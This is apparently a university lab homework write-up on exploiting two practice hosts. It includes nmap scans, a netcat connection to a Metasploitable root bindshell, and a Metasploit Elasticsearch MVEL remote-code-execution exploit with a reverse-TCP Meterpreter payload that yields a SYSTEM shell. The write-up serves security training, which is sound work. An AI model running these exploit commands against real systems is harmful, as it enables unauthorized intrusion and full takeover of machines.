# Homework 7

## L0 (Easiest) - 172.16.0.38

Scanning result:

```bash
┌──(alonza㉿kali)-[~]
└─$ nmap -p- -sV 172.16.0.38 -oN fullscan.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-17 22:15 HST
Nmap scan report for 172.16.0.38
Host is up (0.0099s latency).
Not shown: 65505 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.3.4
22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp    open  telnet      Linux telnetd
25/tcp    open  smtp        Postfix smtpd
53/tcp    open  domain      ISC BIND 9.4.2
80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp   open  exec        netkit-rsh rexecd
513/tcp   open  login?
514/tcp   open  tcpwrapped
1099/tcp  open  java-rmi    GNU Classpath grmiregistry
1524/tcp  open  bindshell   Metasploitable root shell
2049/tcp  open  nfs         2-4 (RPC #100003)
2121/tcp  open  ftp         ProFTPD 1.3.1
3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp  open  vnc         VNC (protocol 3.3)
6000/tcp  open  X11         (access denied)
6667/tcp  open  irc         UnrealIRCd
6697/tcp  open  irc         UnrealIRCd
8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
33897/tcp open  mountd      1-3 (RPC #100005)
34751/tcp open  java-rmi    GNU Classpath grmiregistry
47290/tcp open  status      1 (RPC #100024)
52634/tcp open  nlockmgr    1-4 (RPC #100021)
MAC Address: 40:74:E0:A1:99:B5 (Intel Corporate)
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 142.24 seconds
```

1. Method 1

    Target port:

    ```bash
    ...
    1524/tcp open bindshell Metasploitable root shell
    ...
    ```

    We can use `nc` to get the root priviliege:

    ```bash
    ┌──(alonza㉿kali)-[~]
    └─$ nc 172.16.0.38 1524
    root@metasploitable:/# sudo echo

    root@metasploitable:/# 
    ```

## L1 (Normal) - 172.16.0.74

## L2 (Plus) - 172.16.0.97

Scanning result:

```bash
┌──(alonza㉿kali)-[~]
└─$ nmap -p- -sV 172.16.0.97 -oN fullscan.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-17 21:37 HST
Nmap scan report for SEC-NYCU-PMEWin.Wayne.server (172.16.0.97)
Host is up (0.0089s latency).
Not shown: 65498 closed tcp ports (reset)
PORT      STATE SERVICE              VERSION
21/tcp    open  ftp                  Microsoft ftpd
22/tcp    open  ssh                  OpenSSH 7.1 (protocol 2.0)
80/tcp    open  http                 Microsoft IIS httpd 7.5
135/tcp   open  msrpc                Microsoft Windows RPC
139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds         Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1617/tcp  open  java-rmi             Java RMI
3306/tcp  open  mysql                MySQL 5.5.20-log
3389/tcp  open  ms-wbt-server        Microsoft Terminal Service
3700/tcp  open  giop
3920/tcp  open  ssl/exasoftport1?
4848/tcp  open  ssl/http             Oracle Glassfish Application Server
5985/tcp  open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7676/tcp  open  java-message-service Java Message Service 301
8009/tcp  open  ajp13                Apache Jserv (Protocol v1.3)
8020/tcp  open  http                 Apache httpd
8027/tcp  open  papachi-p2p-srv?
8080/tcp  open  http                 Sun GlassFish Open Source Edition  4.0
8181/tcp  open  ssl/http             Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
8282/tcp  open  http                 Apache Tomcat/Coyote JSP engine 1.1
8383/tcp  open  http                 Apache httpd
8484/tcp  open  http                 Jetty winstone-2.8
8585/tcp  open  http                 Apache httpd 2.2.21 ((Win64) PHP/5.3.10 DAV/2)
8686/tcp  open  java-rmi             Java RMI
9200/tcp  open  http                 Elasticsearch REST API 1.1.1 (name: Dougboy; Lucene 4.7)
9300/tcp  open  vrace?
47001/tcp open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc                Microsoft Windows RPC
49153/tcp open  msrpc                Microsoft Windows RPC
49154/tcp open  msrpc                Microsoft Windows RPC
49155/tcp open  msrpc                Microsoft Windows RPC
49199/tcp open  java-rmi             Java RMI
49200/tcp open  tcpwrapped
49201/tcp open  msrpc                Microsoft Windows RPC
49238/tcp open  msrpc                Microsoft Windows RPC
49255/tcp open  ssh                  Apache Mina sshd 0.8.0 (protocol 2.0)
49256/tcp open  jenkins-listener     Jenkins TcpSlaveAgentListener
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
...
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 190.14 seconds
```

1. Method 1

    Target port:

    ```bash
    ...
    49255/tcp openssh Apache Mina sshd 0.8.0 (protocol 2.0)
    ...
    ```

    Use `curl` to get version:

    ```bash
    ┌──(alonza㉿kali)-[~]
    └─$ curl http://172.16.0.97:9200/ 

    {
    "status" : 200,
    "name" : "Dougboy",
    "version" : {
        "number" : "1.1.1",
        "build_hash" : "f1585f096d3f3985e73456debdc1a0745f512bbc",
        "build_timestamp" : "2014-04-16T14:27:12Z",
        "build_snapshot" : false,
        "lucene_version" : "4.7"
    },
    "tagline" : "You Know, for Search"
    }
    ```

    Start exploit:

    ```bash
    msfconsole
    ```

    ```bash
    use exploit/multi/elasticsearch/script_mvel_rce
    set RHOSTS 172.16.0.97
    set RPORT 9200
    set PAYLOAD java/meterpreter/reverse_tcp
    set LHOST 172.16.0.118
    set LPORT 4444
    run
    ```

    Then get:

    ```bash
    msf6 exploit(multi/elasticsearch/script_mvel_rce) >     run
    [*] Started reverse TCP handler on 172.16.0.118:4444 
    [*] Trying to execute arbitrary Java...
    [*] Discovering remote OS...
    [+] Remote OS is 'Windows Server 2008 R2'
    [*] Discovering TEMP path
    [+] TEMP path identified: 'C:\Windows\TEMP\'
    [*] Sending stage (58073 bytes) to 172.16.0.97
    [*] Meterpreter session 3 opened (172.16.0.118:4444 -> 172.16.0.97:63368) at 2025-11-17 22:08:45 -1000
    [!] This exploit may require manual cleanup of 'C:\Windows\TEMP\ADto.jar' on the target
    ```

    Checkout to shell and `whoami`:

    ```bash
    meterpreter > shell
    Process 3 created.
    Channel 3 created.
    Microsoft Windows [Version 6.1.7601]
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

    C:\Program Files\elasticsearch-1.1.1>whoami
    whoami
    nt authority\system
    ```

## Contribution Table

| Student ID | Works | Percentage |
| - | - | - |
| 314581015 | L0-M1 | 35% |
| 313581047 | L2-M1 | 30% |
| 313581038 | scanning | 15% |
| 313581055 | scanning | 15% |
| 412581005 | scanning | 15% |
